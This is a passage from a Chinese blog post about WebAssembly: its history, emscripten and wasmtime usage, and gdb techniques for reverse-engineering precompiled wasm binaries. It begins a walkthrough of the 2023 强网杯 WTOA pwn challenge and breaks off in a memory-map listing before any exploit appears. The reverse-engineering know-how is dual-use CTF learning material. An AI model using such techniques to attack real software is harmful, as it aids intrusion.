技术。但由于其开发难度、兼容性等问题最终没有普及开来。在 <code>2017</code> 年 <code>Google</code> 宣布放弃 <code>PNaCl</code> 转向 <code>WebAssembly</code>。</p><h3 id="ASM-js"><a href="#ASM-js" class="headerlink" title="ASM.js"></a>ASM.js</h3><p><code>ASM.js</code> 是 <code>Mozilla</code> 在 <code>2013</code> 年推出的，是 <code>javaScript</code> 的一个严格子集，可以作为 <code>C/C++</code> 编译的目标语言，从而使得 <code>js</code> 引擎可以采用 <code>AOT(Ahead Of Time)</code> 的编译策略，也就是在运行前直接编译成机器码，因此运行速度会有一定的提升。</p><p><code>ASM.js</code> 通常不直接编写，而是作为一种通过编译器生成的中间语言，该编译器获取 <code>C++</code> 或其他语言的源代码，然后输出 <code>ASM.js</code>。</p><p>例如下边的 <code>C</code> 语言代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过编译器编译会生成下边的 <code>js</code> 代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  i = i|<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (i + <span class="number">1</span>)|<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的<code>|0</code> 在 <code>js</code> 中相当于和 <code>0</code> 进行了或操作，所以不影响原本的逻辑。在 <code>asm.js</code> 中起到了类型标记的作用，这样 <code>js</code> 引擎执行的时候就知道 <code>i</code> 是一个整型，返回值是一个整型。除了或操作这种，<code>ASM.js</code> 标准中还规定了很多类似的标记规则，用于告诉 <code>js</code> 引擎变量的类型，便于进行 <code>AOT</code> 优化。</p><p>这看起来和 <code>TypeScript</code> 很像，但其实不是一种东西。<code>TypeScript</code> 是 <code>js</code> 的一个超集，浏览器并不能直接执行 <code>ts</code>，还需要转换为 <code>js</code> 去执行。<code>ts</code> 主要是帮助我们开发人员去看的，增加了代码的可读性，也可以让编辑器提前发现一些错误。而 <code>asm.js</code> 是用于引擎的编译优化。</p><h3 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h3><p>接下来看一下 <code>WebAssembly</code> 的历史。</p><blockquote><p>2015 年 4 月，WebAssembly Community Group 成立；<br>2015 年 6 月，WebAssembly 第一次以 WCG 的官方名义向外界公布；<br>2016 年 8 月，WebAssembly 开始进入了漫长的 “Browser Preview” 阶段；<br>2017 年 2 月，WebAssembly 官方 LOGO 在 Github 上的众多讨论中被最终确定；同年同月，一个历史性的阶段，四大浏览器（FireFox、Chrome、Edge、WebKit）在 WebAssembly 的 MVP（最小可用版本）标准实现上达成共识，这意味着 WebAssembly 在其 MVP 标准上的 “Brower Preview” 阶段已经结束；<br>2017 年 8 月，W3C WebAssembly Working Group 成立，意味着 WebAssembly 正式成为 W3C 众多技术标准中的一员。</p></blockquote><p><code>WebAssembly</code> 于 <code>2019</code> 年 <code>12</code> 月 <code>5</code> 日成为万维网联盟（<code>W3C</code>）的推荐标准，与 <code>HTML</code>，<code>CSS</code> 和 <code>JavaScript</code> 一起成为 <code>Web</code> 的第四种语言。</p><p>可以看一下目前浏览器的支持程度，已经算比较高了。</p><p><img src="https://pica.zhimg.com/80/v2-62c512d5a8cb3b63c585721c223afeb5_720w.webp?source=1def8aca" alt="img"></p><h1 id="环境搭建及工具"><a href="#环境搭建及工具" class="headerlink" title="环境搭建及工具"></a>环境搭建及工具</h1><h2 id="开发环境emscripten"><a href="#开发环境emscripten" class="headerlink" title="开发环境emscripten"></a>开发环境emscripten</h2><p><a href="https://emscripten.org/">emscripten</a> 是一套编译构建方案，同时提供了比较完整的 SDK ，它在。它使我们可以非常方便地使用 C 语言完成 WebAssembly 相关的开发与环境集成。</p><p>安装的方式，是先拉取 git 代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/emscripten-core/emsdk.git</span><br></pre></td></tr></table></figure><p>进入目录后，执行安装，它会下载 C 编辑器，nodejs 等一堆东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd emsdk</span><br><span class="line">./emsdk install latest</span><br><span class="line">./emsdk activate latest</span><br></pre></td></tr></table></figure><p>最后处理一下环境（效果只在终端的当前会话有效）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ./emsdk_env.sh</span><br></pre></td></tr></table></figure><p>当 <code>emcc</code> 是一个可执行命令时，整个环境就准备好了。</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>写一个最简单的hello world程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令行编译</p><p><code>emcc hello.c -o hello.html</code></p><p>因为这个编译出来是html,所以用python搭建一个服务器运行验证一下,</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9000</span><br></pre></td></tr></table></figure><p>之后访问<code>127.0.0.1:9000/hello.html</code>可以看到<code>hello world</code>的消息。以及emsc控制台的界面。</p><h3 id="更多选项"><a href="#更多选项" class="headerlink" title="更多选项"></a>更多选项</h3><p>emcc —help查看</p><h4 id="o"><a href="#o" class="headerlink" title="-o"></a>-o</h4><p>在上一步中我们指定编译结果为html格式</p><p>实际上可以有更多形式</p><p>文档原话是</p><blockquote><p>“-o <target>“<br>   [link] When linking an executable, the “target” file name extension<br>   defines the output type to be generated:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">* &lt;name&gt; **.js** : JavaScript (+ separate **&lt;name&gt;.wasm** file</span><br><span class="line">  if emitting WebAssembly). (default)</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.mjs** : ES6 JavaScript module (+ separate</span><br><span class="line">  **&lt;name&gt;.wasm** file if emitting WebAssembly).</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.html** : HTML + separate JavaScript file</span><br><span class="line">  (**&lt;name&gt;.js**; + separate **&lt;name&gt;.wasm** file if emitting</span><br><span class="line">  WebAssembly).</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.wasm** : WebAssembly without JavaScript support code</span><br><span class="line">  (&quot;standalone Wasm&quot;; this enables &quot;STANDALONE_WASM&quot;).</span><br></pre></td></tr></table></figure><p>   These rules only apply when linking.  When compiling to object code<br>   (See <em>-c</em> below) the name of the output file is irrelevant.</p></blockquote><p>即-o选项指定的<code>生成文件名的后缀</code>会影响编译结果的文件格式及数量</p><p>一般要<u>生成能够由wasm运行时直接运行的文件需要<code>.wasm</code>后缀格式</u>,即webassembly二进制格式</p><h4 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h4><p>指定编译时的一些设置变量</p><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-s WASM=1</span><br><span class="line">-s PURE_WASI=1#尽可能的使用WASI API</span><br><span class="line">-s STACK_OVERFLOW_CHECK=1</span><br></pre></td></tr></table></figure><p>还有许多变量参数,可以在 <code>$HOME/emsdk/upstream/emscripten/src/</code>目录下的<code>setting.js</code>文件中查看</p><h4 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h4><p>保留调试符号信息</p><blockquote><p>“-g<level>“<br>   [compile+link] Controls the level of debuggability. Each level<br>   builds on the previous one:</p><pre><code>  * &quot;-g0&quot;: Make no effort to keep code debuggable.  * &quot;-g1&quot;: When linking, preserve whitespace in JavaScript.  * &quot;-g2&quot;: When linking, preserve function names in compiled code.  * &quot;-g3&quot;: When compiling to object files, keep debug info,    including JS whitespace, function names, and LLVM debug info    (DWARF) if any (this is the same as -g).</code></pre></blockquote><h4 id="O"><a href="#O" class="headerlink" title="-O"></a>-O</h4><p>开启优化</p><h2 id="WASM运行时"><a href="#WASM运行时" class="headerlink" title="WASM运行时"></a>WASM运行时</h2><p>wasm运行时即用于加载、解释和执行 WebAssembly 模块的软件层,其可以模拟浏览器运行wasm的环境,在不启动浏览器的环境下操作wasm</p><p>WASM有四种主流的运行时,分别是</p><p><strong>wasmedge、wasmtime、wasmer、WAVM</strong> </p><p>ctf比赛中出现的比较多的是wasmtime,这里着重介绍它</p><h3 id="wasmtime"><a href="#wasmtime" class="headerlink" title="wasmtime"></a>wasmtime</h3><p>github仓库<a href="https://github.com/bytecodealliance/wasmtime">bytecodealliance/wasmtime: A fast and secure runtime for WebAssembly (github.com)</a></p><p>可以下载历史版本的wasmtime</p><p>主要命令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">  run       Runs a WebAssembly module</span><br><span class="line">  config    Controls Wasmtime configuration settings</span><br><span class="line">  compile   Compiles a WebAssembly module</span><br><span class="line">  explore   Explore the compilation of a WebAssembly module to native code</span><br><span class="line">  serve     Serves requests from a wasi-http proxy component</span><br><span class="line">  settings  Displays available Cranelift settings for a target</span><br><span class="line">  wast      Runs a WebAssembly test script file</span><br><span class="line">  help      Print this message or the help of the given subcommand(s)</span><br></pre></td></tr></table></figure><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>运行wasm文件或者cwasm文件,不过大概率要求加—allow-precompiled选项</p><h4 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h4><p>将wasm文件编译为当前架构下的可执行文件格式(e.g. ELF)</p><p>后缀.cwasm(compiled wasm)</p><p>不过依然不能直接运行,还是要wasmtime执行</p><h4 id="更多选项-1"><a href="#更多选项-1" class="headerlink" title="更多选项"></a>更多选项</h4><h5 id="D"><a href="#D" class="headerlink" title="-D"></a>-D</h5><p>调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-D, --debug &lt;KEY[=VAL[,..]]&gt;</span><br><span class="line">         Debug-related configuration options, `-D help` to see all</span><br></pre></td></tr></table></figure><h5 id="—env"><a href="#—env" class="headerlink" title="—env"></a>—env</h5><p>设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--env &lt;NAME[=VAL]&gt;</span><br><span class="line">          Pass an environment variable to the program.</span><br></pre></td></tr></table></figure><h5 id="—invoke"><a href="#—invoke" class="headerlink" title="—invoke"></a>—invoke</h5><p>单独执行某个函数,可以指定参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--invoke &lt;FUNCTION&gt;</span><br><span class="line">          The name of the function to run</span><br><span class="line"></span><br><span class="line">Invoking a specific function (e.g. `add`) in a WebAssembly module:</span><br><span class="line"></span><br><span class="line">wasmtime --invoke add example.wasm 1 2</span><br></pre></td></tr></table></figure><h5 id="—allow-precompiled"><a href="#—allow-precompiled" class="headerlink" title="—allow-precompiled"></a>—allow-precompiled</h5><p>允许提前编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--allow-precompiled</span><br><span class="line">          Allow executing precompiled WebAssembly modules as `*.cwasm` files.</span><br><span class="line">          </span><br><span class="line">          Note that this option is not safe to pass if the module being passed in is arbitrary user input. Only `wasmtime`-precompiled modules generated via the `wasmtime compile` command or equivalent should be passed as an argument with this option specified.</span><br></pre></td></tr></table></figure><h5 id="—disable-cache-deprecated"><a href="#—disable-cache-deprecated" class="headerlink" title="—disable-cache(deprecated)"></a>—disable-cache(deprecated)</h5><p>老版本选项,不使用缓存</p><h3 id="wabt"><a href="#wabt" class="headerlink" title="wabt"></a>wabt</h3><p>The WebAssembly Binary Toolkit</p><p>官方仓库<a href="https://github.com/WebAssembly/wabt">WebAssembly/wabt: The WebAssembly Binary Toolkit (github.com)</a></p><p>提供了一组wasm的工具包</p><p>主要如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WABT (we pronounce it &quot;wabbit&quot;) is a suite of tools for WebAssembly, including:</span><br><span class="line"></span><br><span class="line">wat2wasm: translate from WebAssembly text format to the WebAssembly binary format</span><br><span class="line">wasm2wat: the inverse of wat2wasm, translate from the binary format back to the text format (also known as a .wat)</span><br><span class="line">wasm-objdump: print information about a wasm binary. Similiar to objdump.</span><br><span class="line">wasm-interp: decode and run a WebAssembly binary file using a stack-based interpreter</span><br><span class="line">wasm-decompile: decompile a wasm binary into readable C-like syntax.</span><br><span class="line">wat-desugar: parse .wat text form as supported by the spec interpreter (s-expressions, flat syntax, or mixed) and print &quot;canonical&quot; flat format</span><br><span class="line">wasm2c: convert a WebAssembly binary file to a C source and header</span><br><span class="line">wasm-strip: remove sections of a WebAssembly binary file</span><br><span class="line">wasm-validate: validate a file in the WebAssembly binary format</span><br><span class="line">wast2json: convert a file in the wasm spec test format to a JSON file and associated wasm binary files</span><br><span class="line">wasm-stats: output stats for a module</span><br><span class="line">spectest-interp: read a Spectest JSON file, and run its tests in the interpreter</span><br></pre></td></tr></table></figure><p>还有其他一些小工具</p><p>wat即Webassembly的文本格式</p><h3 id="WASI"><a href="#WASI" class="headerlink" title="WASI"></a>WASI</h3><p><a href="https://wasi.dev/">WASI </a></p><blockquote><p>WASI is a modular <strong>system interface for WebAssembly</strong>. As described in <a href="https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/">the initial announcement</a>, it’s focused on security and portability.</p></blockquote><p>WebAssembly是一种新的字节码格式，目前被应用于 web 中，由于其可移植、体积小，安全性的等优点被渐渐广泛认可，但是其主要是运行在浏览器中。</p><p>一些天才们想让 WebAssembly 也可以<strong>运行在非浏览器环境中</strong>，这就产生了 WASI。</p><p>wasi需要可移植的二进制文件（.wasm）和一个跨平台的 runtime，也就是说，我们在某一个平台上生成了.wasm，直接拿到其他平台上，也可以直接使用。</p><h1 id="WASM调试"><a href="#WASM调试" class="headerlink" title="WASM调试"></a>WASM调试</h1><p>wasm类题目调试是一大难点</p><p>特别是当提供的是经由wasmtime等运行时二次编译过的适应架构的文件,例如cwasm格式文件</p><h2 id="浏览器调试"><a href="#浏览器调试" class="headerlink" title="浏览器调试"></a>浏览器调试</h2><p>如果提供的文件是非由运行时二次编译的文件</p><p>那么可以使用chrome浏览器的开发者工具进行调试</p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>如果提供的文件是由运行时二次编译的文件</p><p>由于几乎没有符号信息,且代码量较大,想要静态分析难度不低</p><p>那么就得使用gdb进行调试</p><p><code>gdb --args wasmtime --allow-precompiled  cwasm</code></p><p>不过这样显然是直接调试wasmtime程序,而不是我们希望的二进制文件</p><p>但是最终程序控制流肯定会转移给cwasm文件,而既然是题目那就肯定存在由用户控制的输入</p><p>所以我们可以直接运行直到自动断在有输入处,可以发现最终是直接运行cwasm映射在内存中的代码段</p><p>例如,这是2023强网杯WTOA的text段映射,整个text都被映射在这(elf中text段大小就是0xc000)</p><p><code>0x7ffff79fe000     0x7ffff7a0a000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</code></p><p>段内偏移不变,但<strong>段与段之间的偏移是会变</strong>的</p><p>不过只要能够确定代码位置便足够了</p><p>之后触发各种函数,再由gdb回溯栈信息<u>得出各个重要函数的的位置</u>,并<u>回到ida中逆向分析</u></p><p>需要注意的是gdb分析给出的回溯栈信息并不完全准确</p><p>例如</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142030.png" alt=""></p><p>这是最开始的回溯路径,但继续往下执行后它变成了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142230.png" alt=""></p><p>可见回溯栈少了一层,而且查看少的那层可以发现里面确实没有可执行代码</p><p>再往下,在即将再往下一层回溯时,栈又发生了变化</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-01_142601.png" alt=""></p><p>倒没有深入去研究这其中的原由,猜测可能是gdb栈回溯机制的原因</p><p>因为如此,对调试确定代码位置的难度又加大了一点,即不能直接一次性判断所有的栈回溯,而是要缓慢步进,根据正确的栈回溯信息作出判断</p><p>还有最后一点就是,就算确定了静态wasm的代码位置,真正进入静态分析就会发现内部依然是在嵌套调用其它函数,不过此时大可不必不停向下深入分析所有函数,只要能<u>根据经验</u>大致确认一两层便足够了</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2023强网杯-WTOA"><a href="#2023强网杯-WTOA" class="headerlink" title="2023强网杯-WTOA"></a>2023强网杯-WTOA</h2><p>题目提供了两个文件</p><p><code>./launch.sh</code>是一个shell脚本,用于添加flag环境变量并执行程序</p><p><code>wtoa</code>乍一看是一个ELF文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file wtoa </span><br><span class="line">wtoa: ELF 64-bit LSB relocatable, x86-64, version 1, not stripped</span><br></pre></td></tr></table></figure><p>但是当使用ida加载时,会发现其完全不符合认知中的elf规范</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-18_225313.png" alt=""></p><p>根据其中的字符串信息(string file),可以知道这是一个经由11.0.1版本的wasmtime将wasm文件再编译而来的elf</p><p>图片中显示的各个节,在运行时都会映射到内存中使用</p><p>其中<code>.rodata.wasm</code>会被映射两次,一次是以只读模式映射,另一次是可读可写的映射(貌似是在wtoa的<u>模拟堆栈</u>中)</p><p>代码量较大且几乎没有调试符号,直接静态分析显然难度巨大</p><p>因此需要通过调试定位几个关键的函数</p><h3 id="调试定位"><a href="#调试定位" class="headerlink" title="调试定位"></a>调试定位</h3><p>gdb启动</p><p><code>gdb --args /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime run --env FLAG=&quot;$FLAG&quot; --disable-cache --allow-precompiled ./wtoa</code></p><p>首先观察vmmap显示的调试信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555400000     0x555556bce000 r-xp  17ce000      0 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556dce000     0x555556f9e000 r--p   1d0000 17ce000 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556f9e000     0x555556fa1000 rw-p     3000 199e000 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556fa1000     0x555556fe5000 rw-p    44000      0 [heap]</span><br><span class="line">    0x7ffdf7bb1000     0x7ffe77bb1000 ---p 80000000      0 [anon_7ffdf7bb1]</span><br><span class="line">    0x7ffe77bb1000     0x7ffe77bb3000 rw-p     2000  1b000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffe77bb3000     0x7ffe78bb1000 rw-p   ffe000      0 [anon_7ffe77bb3]</span><br><span class="line">    0x7ffe78bb1000     0x7ffff7bb2000 ---p 17f001000      0 [anon_7ffe78bb1]</span><br><span class="line">    0x7ffff7bb2000     0x7ffff7bf2000 rw-p    40000      0 [anon_7ffff7bb2]</span><br><span class="line">    0x7ffff7bf2000     0x7ffff7bf3000 r--p     1000      0 [anon_7ffff7bf2]</span><br><span class="line">    0x7ffff7bf3000     0x7ffff7bf4000 r-xp     1000      0 [anon_7ffff7bf3]</span><br><span class="line">    0x7ffff7bf4000     0x7ffff7bf6000 r--p     2000      0 [anon_7ffff7bf4]</span><br><span class="line">    0x7ffff7bf6000     0x7ffff7bf7000 r-xp     1000      0 [anon_7ffff7bf6]</span><br><span class="line">    0x7ffff7bf7000     0x7ffff7bf9000 r--p     2000      0 [anon_7ffff7bf7]</span><br><span class="line">    0x7ffff7bf9000     0x7ffff7bfa000 r-xp     1000      0 [anon_7ffff7bf9]</span><br><span class="line">    0x7ffff7bfa000     0x7ffff7bfc000 r--p     2000      0 [anon_7ffff7bfa]</span><br><span class="line">    0x7ffff7bfc000     0x7ffff7bfd000 r-xp     1000      0 [anon_7ffff7bfc]</span><br><span class="line">    0x7ffff7bfd000     0x7ffff7bfe000 r--p     1000      0 [anon_7ffff7bfd]</span><br><span class="line">    0x7ffff7bfe000     0x7ffff7bff000 r--p     1000      0 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7bff000     0x7ffff7c0b000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7c0b000     0x7ffff7c1f000 r--p    14000   d000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7c1f000     0x7ffff7c24000 rw-p     5000      0 [anon_7ffff7c1f]</span><br><span class="line">    0x7ffff7c24000     0x7ffff7c46000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7c46000     0x7ffff7dbe000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7dbe000     0x7ffff7e0c000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e0c000     0x7ffff7e10000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e10000     0x7ffff7e12000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e12000     0x7ffff7e16000 rw-p     4000      0 [anon_7ffff7e12]</span><br><span class="line">    0x7ffff7e16000     0x7ffff7e23000 r--p     d000      0 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7e23000     0x7ffff7eca000 r-xp    a7000   d000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7eca000     0x7ffff7f63000 r--p    99000  b4000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f63000     0x7ffff7f64000 r--p     1000 14c000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f64000     0x7ffff7f65000 rw-p     1000 14d000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f65000     0x7ffff7f6b000 r--p     6000      0 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f6b000     0x7ffff7f7c000 r-xp    11000   6000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f7c000     0x7ffff7f82000 r--p     6000  17000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f82000     0x7ffff7f83000 r--p     1000  1c000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f83000     0x7ffff7f84000 rw-p     1000  1d000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f84000     0x7ffff7f88000 rw-p     4000      0 [anon_7ffff7f84]</span><br><span class="line">    0x7ffff7f88000     0x7ffff7f8a000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f8a000     0x7ffff7f8e000 r-xp     4000   2000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f8e000     0x7ffff7f90000 r--p     2000   6000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f90000     0x7ffff7f91000 r--p     1000   7000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f91000     0x7ffff7f92000 rw-p     1000   8000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f92000     0x7ffff7f95000 r--p     3000      0 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7f95000     0x7ffff7fa7000 r-xp    12000   3000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fa7000     0x7ffff7fab000 r--p     4000  15000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fab000     0x7ffff7fac000 r--p     1000  18000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fac000     0x7ffff7fad000 rw-p     1000  19000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fad000     0x7ffff7fae000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fae000     0x7ffff7fb0000 r-xp     2000   1000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb0000     0x7ffff7fb1000 r--p     1000   3000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb1000     0x7ffff7fb2000 r--p     1000   3000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb2000     0x7ffff7fb3000 rw-p     1000   4000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb3000     0x7ffff7fb5000 rw-p     2000      0 [anon_7ffff7fb3]</span><br><span class="line">    0x7ffff7fb7000     0x7ffff7fb8000 r--p     1000      0 [anon_7ffff7fb7]</span><br><span class="line">    0x7ffff7fb8000     0x7ffff7fb9000 r-xp     1000      0 [anon_7ffff7fb8]</span><br><span 